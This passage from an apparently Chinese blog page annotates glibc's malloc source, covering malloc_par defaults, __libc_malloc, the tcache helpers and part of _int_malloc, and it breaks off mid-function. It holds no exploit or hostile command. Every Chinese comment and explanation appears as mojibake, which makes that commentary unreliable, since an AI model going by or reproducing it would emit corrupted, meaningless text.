  ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem (p)) \
   &amp; MALLOC_ALIGN_MASK)
</code></pre>
<h3 id="malloc-par"><a href="#malloc-par" class="headerlink" title="malloc_par"></a>malloc_par</h3><pre><code class="c">struct malloc_par
{
  /* Tunable parameters */
  unsigned long trim_threshold;
  INTERNAL_SIZE_T top_pad;
  INTERNAL_SIZE_T mmap_threshold;
  INTERNAL_SIZE_T arena_test;
  INTERNAL_SIZE_T arena_max;

  /* Memory map support */
  int n_mmaps;
  int n_mmaps_max;
  int max_n_mmaps;
  /* the mmap_threshold is dynamic, until the user sets
     it manually, at which point we need to disable any
     dynamic behavior. */
  int no_dyn_threshold;

  /* Statistics */
  INTERNAL_SIZE_T mmapped_mem;
  INTERNAL_SIZE_T max_mmapped_mem;

  /* First address handed out by MORECORE/sbrk.  */
  char *sbrk_base;

#if USE_TCACHE
  /* Maximum number of buckets to use.  */
  size_t tcache_bins;
  size_t tcache_max_bytes;
  /* Maximum number of chunks in each bucket.  */
  size_t tcache_count;
  /* Maximum number of chunks to remove from the unsorted list, which
     aren&#39;t used to prefill the cache.  */
  size_t tcache_unsorted_limit;
#endif
};

/* There is only one instance of the malloc parameters.  */

static struct malloc_par mp_ =
{
  .top_pad = DEFAULT_TOP_PAD,
  .n_mmaps_max = DEFAULT_MMAP_MAX,
  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,
  .trim_threshold = DEFAULT_TRIM_THRESHOLD,
#define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))
  .arena_test = NARENAS_FROM_NCORES (1)
#if USE_TCACHE
  ,
  .tcache_count = TCACHE_FILL_COUNT,
  .tcache_bins = TCACHE_MAX_BINS,
  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS-1),
  .tcache_unsorted_limit = 0 /* No limit.  */
#endif
};
</code></pre>
<ul>
<li>trim_thresholdï¼šåœ¨free()ä¸­è¢«ä¿®å‰ªå‰çš„æœ€å¤§é¡¶éƒ¨å—å¤§å°ï¼Œé»˜è®¤ä¸º0x20000ã€‚</li>
<li>top_padï¼š å½“ æ‰©å¤§ top_chunk æ—¶ï¼Œéœ€è¦ç”³è¯·å¤šå°‘é¢å¤–çš„å†…å­˜ï¼Œé»˜è®¤ä¸º0x20000ã€‚</li>
<li>mmap_thresholdï¼šmmap()æ‰€æœåŠ¡çš„æœ€å°å—å¤§å°ï¼Œé»˜è®¤ä¸º0x20000ã€‚</li>
<li>arena_testï¼šé»˜è®¤ä¸º8ã€‚</li>
<li>arena_maxï¼šé»˜è®¤ä¸º0ã€‚</li>
<li>n_mmapsï¼šå½“å‰çš„mmapped chunkè®¡æ•°ï¼Œä»0å¼€å§‹ã€‚</li>
<li>n_mmaps_maxï¼šå…è®¸çš„æœ€å¤§mmapped chunksæ•°é‡ï¼Œé»˜è®¤ä¸º0x10000ã€‚ </li>
<li>max_n_mmapsï¼šåˆ° ç›®å‰ä¸ºæ­¢å¹¶å‘çš„mmapped chunksçš„æœ€é«˜æ•°é‡ã€‚</li>
<li>no_dyn_thresholdï¼šæ˜¯å¦ç¦ç”¨åŠ¨æ€ mmap thresholdè¡Œä¸ºã€‚</li>
<li>mmapped_memï¼šå½“å‰æœ‰å¤šå°‘å†…å­˜è¢«mmappedã€‚</li>
<li>max_mmapped_memï¼šä¸€æ¬¡æ€§å­˜åœ¨çš„æœ€é«˜mmappedå†…å­˜é‡ã€‚</li>
<li>sbrk_baseï¼šç”±sbrkå‘æ”¾çš„1ä¸ªst åœ°å€ã€‚</li>
<li>tcache_binsï¼š è¦ä½¿ç”¨çš„tcache binsçš„æ•°é‡ï¼Œé»˜è®¤ä¸º0x40ã€‚</li>
<li>tcache_max_bytesï¼štcache chunksæ”¯æŒçš„æœ€å¤§ç”¨æˆ·æ•°æ®ï¼Œé»˜è®¤ä¸º0x408ã€‚</li>
<li>tcache_countï¼šæ¯ä¸ª tcachebin ä¸­çš„æœ€å¤§å—æ•°ï¼Œé»˜è®¤ 7ã€‚</li>
<li>unsorted_limitï¼šå¡«å…… tcache æ—¶çš„æœ€å¤§ unsortedbin è¿­ä»£æ¬¡æ•°ã€‚</li>
</ul>
<h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><pre><code class="c">/*
  malloc(size_t n)
  Returns a pointer to a newly allocated chunk of at least n bytes, or null
  if no space is available. Additionally, on failure, errno is
  set to ENOMEM on ANSI C systems.

  If n is zero, malloc returns a minumum-sized chunk. (The minimum
  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit
  systems.)  On most systems, size_t is an unsigned type, so calls
  with negative arguments are interpreted as requests for huge amounts
  of space, which will often fail. The maximum supported value of n
  differs across systems, but is in all cases less than the maximum
  representable value of a size_t.
*/
void *__libc_malloc(size_t bytes) {
    mstate ar_ptr; // arena
    void *victim; // æ‰€è¿”å›çš„å †å—

    // è¯»å– __malloc_hook é’©å­, å¦‚æœæœ‰å€¼ï¼Œåˆ™è¿è¡Œé’©å­å‡½æ•°å¹¶è¿”å›
    void *(*hook)(size_t, const void *)
    = atomic_forced_read(__malloc_hook);
    if (__builtin_expect(hook != NULL, 0))
        return (*hook)(bytes, RETURN_ADDRESS (0));

    // ä½¿ç”¨ tchache çš„æƒ…å†µ
#if USE_TCACHE
    /* int_free also calls request2size, be careful to not pad twice.  */
    size_t tbytes;

    // åˆ¤æ–­è¯·æ±‚åˆ†é…å­—èŠ‚çš„å¤§å°
    // è®¡ç®— bytes æ•°æ®éœ€è¦åˆ†é…çš„å†…å­˜å¤§å°ï¼Œå½“ bytes æ•°æ®çš„å¤§å°æ¯”æœ€å° chunk è¦è¿˜å°æ—¶,
    // æŒ‰æœ€å° chunk çš„å¤§å°åˆ†é…ï¼›å½“ bytes æ•°æ®çš„å¤§å°æ¯”æœ€å° chunk å¤§æ—¶ï¼Œåˆ™åˆ†é…æ»¡è¶³å†…å­˜
    // bytesæœ€å¤§ä¸è¶…è¿‡(unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE)
    checked_request2size (bytes, tbytes);
    // è®¡ç®— tbytes å¤§å°æ‰€å¯¹åº”çš„ tcache ä¸‹æ ‡
    size_t tc_idx = csize2tidx (tbytes);
    // å¦‚æœ tcache è¿˜æ²¡æœ‰è¢«åˆ›å»ºï¼Œåˆ™è°ƒç”¨ tcache_init() åˆå§‹åŒ– tcache
    MAYBE_INIT_TCACHE ();

    DIAG_PUSH_NEEDS_COMMENT;

    // å¦‚æœ tc_idx åœ¨ tcache bins çš„èŒƒå›´å†…
    // ä¸” tcache å­˜åœ¨
    // ä¸” tc_idx å¯¹åº”çš„ entry ä¸ä¸ºç©º å³ æœ‰ç©ºé—²çš„ tcache chunk
    if (tc_idx &lt; mp_.tcache_bins
        /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */
        &amp;&amp; tcache
        &amp;&amp; tcache-&gt;entries[tc_idx] != NULL)
      {
        // è¿”å›ç›¸åº”çš„ tcache chunk
        return tcache_get (tc_idx);
      }
    DIAG_POP_NEEDS_COMMENT;
#endif

    // æ²¡æœ‰å¯ç”¨å¤šçº¿ç¨‹çš„æƒ…å†µ
    if (SINGLE_THREAD_P) {
        // è°ƒç”¨ _int_malloc è·å– chunk
        victim = _int_malloc(&amp;main_arena, bytes);
        // æ»¡è¶³ä»¥ä¸‹ 3 ä¸ªæ¡ä»¶ä»»æ„ä¸€ä¸ªå³å¯è¿”å›
        // 1. victim ä¸ºç©º
        // 2. victim æ˜¯ä» mmap åˆ†é…çš„
        // 3. victim æ˜¯ä»ä¸»åˆ†é…åŒºï¼ˆmain_arenaï¼‰åˆ†é…çš„
        assert(!victim || chunk_is_mmapped (mem2chunk(victim)) ||
               &amp;main_arena == arena_for_chunk (mem2chunk(victim)));
        return victim;
    }

    // å¯ç”¨å¤šçº¿ç¨‹çš„æƒ…å†µ
    // è·å–å½“å‰çš„ arena
    arena_get (ar_ptr, bytes);

    // è°ƒç”¨ _int_malloc è·å– chunk
    victim = _int_malloc(ar_ptr, bytes);
    /* Retry with another arena only if we were able to find a usable arena
       before.  */
    // å¦‚æœæœªæˆåŠŸè·å– arena, æˆ–è€…æ²¡æœ‰åˆ†é… chunk
    if (!victim &amp;&amp; ar_ptr != NULL) {
        LIBC_PROBE(memory_malloc_retry, 1, bytes);
        // å†æ¬¡å°è¯•
        ar_ptr = arena_get_retry(ar_ptr, bytes);
        victim = _int_malloc(ar_ptr, bytes);
    }

    // é‡Šæ”¾çº¿ç¨‹é”
    if (ar_ptr != NULL)
        __libc_lock_unlock(ar_ptr-&gt;mutex);

    // æ»¡è¶³ä»¥ä¸‹ 3 ä¸ªæ¡ä»¶ä»»æ„ä¸€ä¸ªå³å¯è¿”å›
    // 1. victim ä¸ºç©º
    // 2. victim æ˜¯ä» mmap åˆ†é…çš„
    // 3. victim æ˜¯ä»ä¸»åˆ†é…åŒºï¼ˆmain_arenaï¼‰åˆ†é…çš„
    assert(!victim || chunk_is_mmapped (mem2chunk(victim)) ||
           ar_ptr == arena_for_chunk (mem2chunk(victim)));
    return victim;
}
</code></pre>
<h4 id="MAYBE-INIT-TCACHE"><a href="#MAYBE-INIT-TCACHE" class="headerlink" title="MAYBE_INIT_TCACHE"></a>MAYBE_INIT_TCACHE</h4><pre><code class="c">#if USE_TCACHE
...
static __thread bool tcache_shutting_down = false;
static __thread tcache_perthread_struct *tcache = NULL;
...
# define MAYBE_INIT_TCACHE() \
  if (__glibc_unlikely (tcache == NULL)) \
    tcache_init();

#else  /* !USE_TCACHE */

# define MAYBE_INIT_TCACHE()

static void
tcache_thread_shutdown(void) {
    /* Nothing to do if there is no thread cache.  */
}

#endif /* !USE_TCACHE  */
</code></pre>
<pre><code class="c">static void tcache_init(void)
{
  mstate ar_ptr;
  void *victim = 0;
  // è®¡ç®— tcahce_perthread_struct ç»“æ„ä½“çš„å¤§å°
  const size_t bytes = sizeof (tcache_perthread_struct);

  // å¦‚æœ tcache è¢«ç¦ç”¨ï¼Œç›´æ¥è¿”å›
  if (tcache_shutting_down)
    return;

  // ç»™ tcache åˆ†é…ç›¸åº”çš„å†…å­˜
  arena_get (ar_ptr, bytes);
  victim = _int_malloc (ar_ptr, bytes);
  if (!victim &amp;&amp; ar_ptr != NULL)
    {
      ar_ptr = arena_get_retry (ar_ptr, bytes);
      victim = _int_malloc (ar_ptr, bytes);
    }


  if (ar_ptr != NULL)
    __libc_lock_unlock (ar_ptr-&gt;mutex);

  /* In a low memory situation, we may not be able to allocate memory
     - in which case, we just keep trying later.  However, we
     typically do this very early, so either there is sufficient
     memory, or there isn&#39;t enough memory to do non-trivial
     allocations anyway.  */
  if (victim)
    {
      // ç»™ tcache èµ‹å€¼
      tcache = (tcache_perthread_struct *) victim;
      // å°† tcache å¤„çš„å†…å­˜åˆå§‹åŒ–ä¸º 0
      memset (tcache, 0, sizeof (tcache_perthread_struct));
    }
}
</code></pre>
<pre><code class="c">static void tcache_thread_shutdown (void)
{
  int i;
  tcache_perthread_struct *tcache_tmp = tcache;
  // tcache ä¸å­˜åœ¨ç›´æ¥è¿”å›
  if (!tcache)
    return;

  /* Disable the tcache and prevent it from being reinitialized.  */
  // ç¦ç”¨ tcache å¹¶é˜²æ­¢å®ƒè¢«é‡æ–°åˆå§‹åŒ–
  tcache = NULL;
  tcache_shutting_down = true;

  /* Free all of the entries and the tcache itself back to the arena
     heap for coalescing.  */
  // å°†æ‰€æœ‰æ¡ç›®å’Œ tcache æœ¬èº«é‡Šæ”¾å› arena ä»¥è¿›è¡Œåˆå¹¶
  for (i = 0; i &lt; TCACHE_MAX_BINS; ++i)
    {
      while (tcache_tmp-&gt;entries[i])
    {
      tcache_entry *e = tcache_tmp-&gt;entries[i];
      tcache_tmp-&gt;entries[i] = e-&gt;next;
      __libc_free (e);
    }
    }

  __libc_free (tcache_tmp);
}
</code></pre>
<h4 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h4><pre><code class="c">/* Caller must ensure that we know tc_idx is valid and there&#39;s
   available chunks to remove.  */
static __always_inline void * tcache_get (size_t tc_idx)
{
  // å–å‡º tc_idx æ‰€å¯¹åº”çš„é“¾è¡¨
  tcache_entry *e = tcache-&gt;entries[tc_idx];
  assert (tc_idx &lt; TCACHE_MAX_BINS);
  assert (tcache-&gt;entries[tc_idx] &gt; 0);
  // å–å‡ºç¬¬ä¸€ä¸ª
  tcache-&gt;entries[tc_idx] = e-&gt;next;
  // å¯¹åº”çš„ tcache_count - 1
  --(tcache-&gt;counts[tc_idx]);
  // è¿”å› chunk
  return (void *) e;
}
</code></pre>
<h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h3><pre><code class="c">static void *_int_malloc(mstate av, size_t bytes) {
    INTERNAL_SIZE_T nb;               /* normalized request size */
    unsigned int idx;                 /* associated bin index */
    mbinptr bin;                      /* associated bin */

    mchunkptr victim;                 /* inspected/selected chunk */
    INTERNAL_SIZE_T size;             /* its size */
    int victim_index;                 /* its bin index */

    mchunkptr remainder;              /* remainder from a split */
    unsigned long remainder_size;     /* its size */

    unsigned int block;               /* bit map traverser */
    unsigned int bit;                 /* bit map traverser */
    unsigned int map;                 /* current word of binmap */

    mchunkptr fwd;                    /* misc temp for linking */
    mchunkptr bck;                    /* misc temp for linking */

#if USE_TCACHE
    size_t tcache_unsorted_count;        /* count of unsorted chunks processed */
#endif

    /*
       Convert request size to internal form by adding SIZE_SZ bytes
       overhead plus possibly more to obtain necessary alignment and/or
       to obtain a size of at least MINSIZE, the smallest allocatable
       size. Also, checked_request2size traps (returning 0) request sizes
       that are so large that they wrap around zero when padded and
       aligned.
     */

    // æ£€æŸ¥è¯·æ±‚å¤§å°æ˜¯å¦åˆè§„
    // è®¡ç®— bytes æ•°æ®éœ€è¦åˆ†é…çš„å†…å­˜å¤§å°ï¼Œå½“ bytes æ•°æ®çš„å¤§å°æ¯”æœ€å° chunk è¦è¿˜å°æ—¶,
    // æŒ‰æœ€å° chunk çš„å¤§å°åˆ†é…ï¼›å½“ bytes æ•°æ®çš„å¤§å°æ¯”æœ€å° chunk å¤§æ—¶ï¼Œåˆ™åˆ†é…æ»¡è¶³å†…å­˜
    // bytesæœ€å¤§ä¸è¶…è¿‡(unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE)
    checked_request2size (bytes, nb);

    /* There are no usable arenas.  Fall back to sysmalloc to get a chunk from
       mmap.  */
    // å¦‚æœæ²¡æœ‰å¯ç”¨çš„åˆ†é…åŒºï¼Œåˆ™è°ƒç”¨ sysmalloc è·å– chunk
    if (__glibc_unlikely(av == NULL)) {
        void *p = sysmalloc(nb, av);
        if (p != NULL)
            /*
             *  static int perturb_byte;

                static void
                alloc_perturb(char *p, size_t n) {
                    if (__glibc_unlikely(perturb_byte))
                        memset(p, perturb_byte ^ 0xff, n);
                }

             */
            //å°† p å…¨éƒ¨è®¾ç½®ä¸º perturb_byte ,é»˜è®¤ä»€ä¹ˆä¹Ÿä¸åš
            alloc_perturb(p, bytes);
        return p;
    }

    /*
       If the size qualifies as a fastbin, first check corresponding bin.
       This code is safe to execute even if av is not yet initialized, so we
       can try it without checking, which saves some time on this fast path.
     */

#define REMOVE_FB(fb, victim, pp)            \
  do                            \
    {                            \
      victim = pp;                    \
      if (victim == NULL)                \
    break;                        \
    }                            \
  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \
     != victim);                    \
    // catomic_compare_and_exchange_val_rel_acq åŠŸèƒ½æ˜¯ å¦‚æœ*fbç­‰äºvictimï¼Œåˆ™å°†*fbå­˜å‚¨ä¸ºvictim-&gt;fdï¼Œè¿”å›victimï¼›
    // å…¶ä½œç”¨æ˜¯ä»åˆšåˆšå¾—åˆ°çš„ç©ºé—²chunké“¾è¡¨æŒ‡é’ˆä¸­å–å‡ºç¬¬ä¸€ä¸ªç©ºé—²çš„chunk(victim)ï¼Œå¹¶å°†é“¾è¡¨å¤´è®¾ç½®ä¸ºè¯¥ç©ºé—²chunkçš„ä¸‹ä¸€ä¸ªchunk(victim-&gt;fd)

    // å¦‚æœè§„èŒƒåŒ–åçš„å¤§å° å°äºç­‰äº fast bins ä¸­çš„æœ€å¤§ chunk å¤§å°
    if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast())) {
        // åœ¨ fastbin ä¸­æ‹¿åˆ°ç›¸åº”çš„ç´¢å¼•
        idx = fastbin_index (nb);
        // å–å¾—å¯¹åº” fastbin ä¸­çš„ç¬¬ä¸€ä¸ª chunk
        mfastbinptr *fb = &amp;fastbin (av, idx);
        mchunkptr pp;
        victim = *fb;

        // å¦‚æœè¯¥ fastbin ä¸­æœ‰å€¼
        if (victim != NULL) {
            // å¦‚æœæ˜¯å•çº¿ç¨‹
            if (SINGLE_THREAD_P)
                // å–å‡º victim
                *fb = victim-&gt;fd;
            else
                // å–å‡º victim
                REMOVE_FB (fb, pp, victim);
            // victim ä¸ä¸ºç©º
            if (__glibc_likely(victim != NULL)) {
                // è®¡ç®— victim æ‰€å¯¹åº”çš„ fastbin ç´¢å¼•
                size_t victim_idx = fastbin_index (chunksize(victim));
                // æ‰€åˆ†é…ç»™çš„ victim çš„ victim_idx è¦å’Œ åˆšå¼€å§‹è®¡ç®—å‡ºçš„ idx ç›¸ç­‰
                if (__builtin_expect(victim_idx != idx, 0))
                    malloc_printerr(&quot;malloc(): memory corruption (fast)&quot;);
                // å•¥ä¹Ÿæ²¡å¹²
                check_remalloced_chunk (av, victim, nb);
// å¦‚æœä½¿ç”¨ tcache
#if USE_TCACHE
                /* While we&#39;re here, if we see other chunks of the same size,
               stash them in the tcache.  */
                // å–å¾—å¯¹åº”å¤§å°çš„ tcache idx
                size_t tc_idx = csize2tidx (nb);
                // æ£€æŸ¥ tcache
                if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)
              {
                mchunkptr tc_victim;

                /* While bin not empty and tcache not full, copy chunks.  */
                // tc_idx æ‰€å¯¹åº”çš„ entry æœªæ»¡ï¼Œ ä¸”ç›¸åº”å¤§å°çš„ fastbin è¿˜æœ‰å€¼
                // å°±æŠŠ fastbin ä¸­çš„å€¼ç§»è‡³ tcache bin ä¸­ï¼Œç›´åˆ° tcache å·²æ»¡
                while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count
                   &amp;&amp; (tc_victim = *fb) != NULL)
                  {
                    if (SINGLE_THREAD_P)
                        *fb = tc_victim-&gt;fd;
                    else
                  {
                    REMOVE_FB (fb, pp, tc_victim);
                    if (__glibc_unlikely (tc_victim == NULL))
                      break;
                  }
                    // å°† fast bin ä¸­çš„ chunk æ’å…¥ tcache bin ä¸­
                    tcache_put (tc_victim, tc_idx);
                  }
              }
#endif
                // æ‹¿åˆ°ç”¨æˆ·æŒ‡é’ˆ
                void *p = chunk2mem (victim);
                // å°† p å…¨éƒ¨è®¾ç½®ä¸º perturb_byte ,é»˜è®¤ä»€ä¹ˆä¹Ÿä¸åš
                alloc_perturb(p, bytes);
                // è¿”å›
                return p;
            }
        }
    }

    /*
       If a small request, check regular bin.  Since these &quot;smallbins&quot;
       hold one size each, no searching within bins is necessary.
       (For a large request, we need to wait until unsorted chunks are
       processed to find best fit. But for small ones, fits are exact
       anyway, so we can check now, which is faster.)
     */
    // å¦‚æœè§„èŒƒåŒ–åçš„å¤§å° åœ¨ samllbin çš„åºåˆ—ä¹‹ä¸­
    if (in_smallbin_range (nb)) {
        // æ‹¿åˆ° ç›¸åº”çš„ç´¢å¼•
        idx = smallbin_index (nb);
        // åœ¨ arena ä¸Šæ‰¾åˆ°ç›¸åº”çš„ä½ç½®
        bin = bin_at (av, idx);
        // è¡¨æ˜ è¯¥ bin ä¸­æœ‰å€¼
        if ((victim = last (bin)) != bin) {
            // æ‹¿åˆ° victim çš„ bk
            bck = victim-&gt;bk;
            // éªŒè¯
            if (__glibc_unlikely(bck-&gt;fd != victim))
                malloc_printerr(&quot;malloc(): smallbin double linked list corrupted&quot;);
            /*
              #define set_inuse_bit_at_offset(p, s)                          \
              (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)
            */
            // è®¾ç½® victim ç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ª chunk çš„ prev_inuse ä½
            set_inuse_bit_at_offset (victim, nb);
            // æ‹¿å‡º victim
            bin-&gt;bk = bck;
            bck-&gt;fd = bin;

            // è®¾ç½® non_main_arena
            if (av != &amp;main_arena)
                set_non_main_arena (victim);

            // å•¥ä¹Ÿæ²¡å¹²
            check_malloced_chunk (av, victim, nb);

            // å’Œä¹‹å‰çš„ä¸€æ ·
            // å¦‚æœå¯¹åº”çš„ tcache bin æœªæ»¡ï¼Œ åˆ™å°† small bin ä¸­çš„å€¼ä¸€ä¸ªä¸€ä¸ªçš„ç§»è¿‡å»
            // ç›´è‡³å¯¹åº”çš„ tcache bin å·²æ»¡
#if USE_TCACHE
            /* While we&#39;re here, if we see other chunks of the same size,
               stash them in the tcache.  */
            size_t tc_idx = csize2tidx (nb);
            if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)
              {
                mchunkptr tc_victim;

                /* While bin not empty and tcache not full, copy chunks over.  */
                while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count
                   &amp;&amp; (tc_victim = last (bin)) != bin)
              {
                if (tc_victim != 0)
                  {
                    bck = tc_victim-&gt;bk;
                    set_inuse_bit_at_offset (tc_victim, nb);
                    if (av != &amp;main_arena)
                  set_non_main_arena (tc_victim);
                    bin-&gt;bk = bck;
                    bck-&gt;fd = bin;

                    tcache_put (tc_victim, tc_idx);
                      }
              }
              }
#endif
            void *p = chunk2mem (victim);
            alloc_perturb(p, bytes);
            return p;
        }
    }

        /*
           If this is a large request, consolidate fastbins before continuing.
           While it might look excessive to kill all fastbins before
           even seeing if there is space available, this avoids
           fragmentation problems normally associated with fastbins.
           Also, in practice, programs tend to have runs of either small or
           large requests, but less often mixtures, so consolidation is not
           invoked all that often in most programs. And the programs that
           it is called frequently in otherwise tend to fragment.
         */
        // å°±å‰© large bin äº†
    else {
        idx = largebin_index (nb);
        // å¦‚æœè¯¥ arena ä¸­å­˜åœ¨ fastbin åˆ™è°ƒç”¨ malloc_consolidate åˆå¹¶
        if (atomic_load_relaxed(&amp;av-&gt;have_fastchunks))
            malloc_consolidate(av);
    }

    /*
       Process recently freed or remaindered chunks, taking one only if
       it is exact fit, or, if this a small request, the chunk is remainder from
       the most recent non-exact fit.  Place other traversed chunks in
       bins.  Note that this step is the only place in any routine where
       chunks are placed in bins.

       The outer loop here is needed because we might not realize until
       near the end of malloc that we should have consolidated, so must
       do so and retry. This happens at most once, and only when we would
       otherwise need to expand memory to service a &quot;small&quot; request.
     */

#if USE_TCACHE
    INTERNAL_SIZE_T tcache_nb = 0;
    //è·å– nb å¯¹åº”å¤§å°çš„ tcache çš„ idx
    size_t tc_idx = csize2tidx (nb);
    //  tcache å­˜åœ¨ä¸”ä¸‹æ ‡ idx åœ¨èŒƒå›´å†…
    if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)
      tcache_nb = nb;
    int return_cached = 0;

    tcache_unsorted_count = 0;
#endif

    // å¤„ç† unsorted bin
    for (;;) {
        int iters = 0;
        // unsorted bin ä¸­æœ‰å€¼ï¼Œä¸”ä¸æ˜¯ arena æœ¬èº«
        while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))
        {
            // ä» bk å¼€å§‹
            bck = victim-&gt;bk;
            // victim çš„ å¤§å° ä¸èƒ½å°äº 2 * SIZE_SZ
            // ä¸”ä¸èƒ½å¤§äº av-&gt;system_mem
            if (__builtin_expect(chunksize_nomask (victim) &lt;= 2 * SIZE_SZ, 0)
                || __builtin_expect(chunksize_nomask (victim)
                                    &gt; av-&gt;system_mem, 0))
                malloc_printerr(&quot;malloc(): memory corruption&quot;);
            // è®¡ç®—è¯¥å— æ ‡å‡†åŒ– åçš„å¤§å°
            size = chunksize (victim);

            /*
               If a small request, try to use last remainder if it is the
               only chunk in unsorted bin.  This helps promote locality for
               runs of consecutive small requests. This is the only
               exception to best-fit, and applies only when there is
               no exact fit for a small chunk.
             */
            //  å¦‚æœè¯·æ±‚çš„å¤§å°åœ¨ smallbin åºåˆ—ä¹‹ä¸­
            //  unsorted bin ä¸­åªæœ‰è¿™ä¸€ä¸ª chunk
            // å¹¶ä¸”è¯¥ victim æ˜¯ last remainder chunk
            // ä¸”è¯¥å—çš„å¤§å°è¦å¤§äºè¯·æ±‚çš„å¤§å°åŠ  MINSIZE
            if (in_smallbin_range (nb) &amp;&amp;
                bck == unsorted_chunks (av) &amp;&amp;
            victim == av-&gt;last_remainder &amp;&amp;
            (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))
            {
                /* split and reattach remainder */
                // åˆ‡å‰² remainder
                remainder_size = size - nb;
                remainder = chunk_at_offset (victim, nb);
                // æŠŠåˆ‡å‰²åçš„ remainder åŠ å…¥ unsorted bin ä¸­
                unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;
                // è®°å½•æ–°å€¼
                av-&gt;last_remainder = remainder;
                // è¿›è¡Œé“¾æ¥
                remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);
                // å¦‚æœ remainder_size çš„å€¼åœ¨ large bin ä¸­
                if (!in_smallbin_range (remainder_size)) {
                    // fd_nextsize,fd_nextsizeæ¸…é›¶
                    remainder-&gt;fd_nextsize = NULL;
                    remainder-&gt;bk_nextsize = NULL;
                }
                // #define set_head(p, s)       ((p)-&gt;mchunk_size = (s)
                // è®¾ç½® victim çš„ size æ ‡å¿—ä½
                set_head (victim, nb | PREV_INUSE |
                                  (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
                // è®¾ç½® remainder çš„ size æ ‡å¿—ä½
                set_head (remainder, remainder_size | PREV_INUSE);
                // #define set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))
                // è®¾ç½® remainder çš„ä¸‹ä¸€ä¸ª chunk çš„ prev_size ä½
                set_foot (remainder, remainder_size);

                // å•¥ä¹Ÿæ²¡å¹²
                check_malloced_chunk (av, victim, nb);
                void *p = chunk2mem (victim);
                alloc_perturb(p, bytes);
                return p;
            }

            /* remove from unsorted list */
            // å°†è¯¥ chunk ä» unsorted list ç§»é™¤
            unsorted_chunks (av)-&gt;bk = bck;
            bck-&gt;fd = unsorted_chunks (av);

            /* Take now instead of binning if exact fit */
            // æ°å¥½å®Œå…¨åŒ¹é…
            if (size == nb) {
                // è®¾ç«‹ä¸‹ä¸€ä¸ª chunk çš„ prev_inuse ä½
                set_inuse_bit_at_offset (victim, size);
                // è®¾ç«‹ non_main_arena ä½
                if (av != &amp;main_arena)
                    set_non_main_arena (victim);
#if USE_TCACHE
                    /* Fill cache first, return to user only if cache fills.
                   We may return one of these chunks later.  */
                    // tcache_nb å­˜åœ¨
                    // å¯¹åº”çš„ tcache_bin æœªæ»¡
                    if (tcache_nb
                    &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)
                  {
                    // æŠŠè¯¥å— åŠ å…¥ tcache bin ä¸­
                    tcache_put (victim, tc_idx);
                    // è®¾ç«‹è¿”å›æ ‡å¿—
                    return_cached = 1;
                    continue;
                  }
                    // ä¸æ»¡è¶³ tcache å‚¨å­˜çš„æƒ…å†µ
                    else
                  {
#endif
                // ç›´æ¥è¿”å›
                check_malloced_chunk (av, victim, nb);
                void *p = chunk2mem (victim);
                alloc_perturb(p, bytes);
                return p;
#if USE_TCACHE
                }
#endif
            }

            /* place chunk in bin */

            if (in_smallbin_range (size)) {
                // æ‹¿åˆ° small_bin çš„ç´¢å¼•
                victim_index = smallbin_index (size);
                // æ‹¿åˆ°é“¾è¡¨å¤´
                bck = bin_at (av, victim_index);
                // æ‹¿åˆ° ç¬¬ä¸€ä¸ªå…ƒç´ 
                fwd = bck-&gt;fd;
            } else {
                // æ‹¿åˆ° large_bin çš„ç´¢å¼•
                victim_index = largebin_index (size);
                // æ‹¿åˆ°é“¾è¡¨å¤´
                bck = bin_at (av, victim_index);
                // æ‹¿åˆ° ç¬¬ä¸€ä¸ªå…ƒç´ 
                fwd = bck-&gt;fd;

                /* maintain large bins in sorted order */
                // large bin ä¸­æœ‰ç©ºé—² chunkå­˜åœ¨
                if (fwd != bck) {
                    /* Or with inuse bit to speed comparisons */
                    //
                    size |= PREV_INUSE;
                    /* if smaller than smallest, bypass loop below */
                    assert(chunk_main_arena (bck-&gt;bk));

                    // large binä¸­çš„chunkæ˜¯æŒ‰ä»å¤§åˆ°å°æ’åˆ—çš„
                    // bck-&gt;bk å½“å‰é“¾è¡¨ä¸­æœ€å°çš„
                    if ((unsigned long) (size)
                        &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)) {
                        // fwd = é“¾è¡¨å¤´
                        // bk = å½“å‰é“¾è¡¨æœ€å°çš„é‚£ä¸ªchunk
                        fwd = bck;
                        bck = bck-&gt;bk;
                        // fd_nextsize = é“¾è¡¨ä¸­é™¤å¤´å¤–çš„ç¬¬ä¸€ä¸ªå…ƒç´ 
                        victim-&gt;fd_nextsize = fwd-&gt;fd;
                        // bk_nextsize = é“¾è¡¨ä¸­é™¤å¤´å¤–çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„ bk_nextsize
                        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;
                        // é“¾è¡¨ä¸­é™¤å¤´å¤–çš„ç¬¬ä¸€ä¸ªå…ƒç´  çš„ bk_nextsize = victim
